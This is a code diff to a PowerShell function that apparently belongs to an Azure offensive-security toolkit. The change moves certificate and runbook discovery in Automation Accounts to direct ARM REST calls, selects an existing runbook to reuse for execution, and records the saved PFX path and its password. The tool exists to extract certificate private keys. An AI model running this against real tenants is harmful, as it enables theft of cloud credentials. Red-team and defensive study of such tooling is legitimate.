@@ -101,15 +101,19 @@ function Get-AutomationCertificateKey {
 
                 Write-Host "`n[*] Automation Account: $accName (RG: $accRg)" -ForegroundColor Cyan
 
-                # ── 2. Discover Certificates in the account via ARG ──────────
-                $certQuery = @"
-resources
-| where type =~ 'microsoft.automation/automationaccounts/certificates'
-| where id startswith '$accId/'
-| project id, name, resourceGroup, thumbprint = tostring(properties.thumbprint), expiry = tostring(properties.expiryTime)
-"@
-                $certs = Invoke-AzBatch -Query $certQuery
-                if ($CertificateName) {
+                # ── 2. Discover Certificates via ARM REST API ──────────
+                # Automation sub-resources (certificates, variables, credentials) are child assets not indexed in ARG
+                $certsUri = "{0}{1}/certificates?api-version=2020-01-13-preview" -f $sv.armUri, $accId
+                try {
+                    $certResponse = Invoke-RestMethod -Uri $certsUri -Headers $auth -Method GET -UserAgent $sv.userAgent
+                    $certs = $certResponse.value
+                }
+                catch {
+                    Write-Verbose "Could not query certificates directly via ARM for $accName : $($_.Exception.Message)"
+                    $certs = @()
+                }
+
+                if ($CertificateName -and $certs) {
                     $certs = $certs | Where-Object { $_.name -eq $CertificateName }
                 }
 
@@ -118,22 +122,26 @@ resources
                     continue
                 }
 
-                # ── 3. Find an existing PowerShell Runbook to use via ARG ────
+                # ── 3. Find an existing PowerShell Runbook via ARM REST API ──
                 $targetRunbook = $RunbookName
                 if (-not $targetRunbook) {
-                    $rbQuery = @"
-resources
-| where type =~ 'microsoft.automation/automationaccounts/runbooks'
-| where id startswith '$accId/'
-| where properties.runbookType =~ 'PowerShell' or properties.runbookType =~ 'PowerShell72'
-| project id, name, runbookType = tostring(properties.runbookType), state = tostring(properties.state)
-"@
-                    $runbooks = Invoke-AzBatch -Query $rbQuery
-                    if (-not $runbooks -or $runbooks.Count -eq 0) {
+                    $runbooksUri = "{0}{1}/runbooks?api-version=2019-06-01" -f $sv.armUri, $accId
+                    try {
+                        $rbResponse = Invoke-RestMethod -Uri $runbooksUri -Headers $auth -Method GET -UserAgent $sv.userAgent
+                        $candidateRunbooks = $rbResponse.value | Where-Object { 
+                            $_.properties.runbookType -in @('PowerShell', 'PowerShell72', 'PowerShellWorkflow') 
+                        }
+                    }
+                    catch {
+                        Write-Verbose "Could not query runbooks for $accName : $($_.Exception.Message)"
+                        $candidateRunbooks = @()
+                    }
+
+                    if (-not $candidateRunbooks -or $candidateRunbooks.Count -eq 0) {
                         Write-Host "  [-] No existing PowerShell runbooks found in $accName to leverage for execution." -ForegroundColor Yellow
                         continue
                     }
-                    $targetRunbook = $runbooks[0].name
+                    $targetRunbook = $candidateRunbooks[0].name
                     Write-Host "  [+] Selected existing runbook for execution: $targetRunbook" -ForegroundColor White
                 }
 
@@ -237,7 +245,7 @@ Write-Output "===BLACKCAT_CERTS_START===`$json===BLACKCAT_CERTS_END==="
                                     AutomationAccount = $accName
                                     ResourceGroup     = $accRg
                                     CertificateName   = $targetCertName
-                                    Thumbprint        = $certMeta.thumbprint
+                                    Thumbprint        = $certMeta.properties.thumbprint
                                     RunbookUsed       = $targetRunbook
                                     OutputFile        = if ($isSuccess) { $savedPfxPath } else { $null }
                                     PfxPassword       = if ($isSuccess) { $PfxPassword } else { $null }
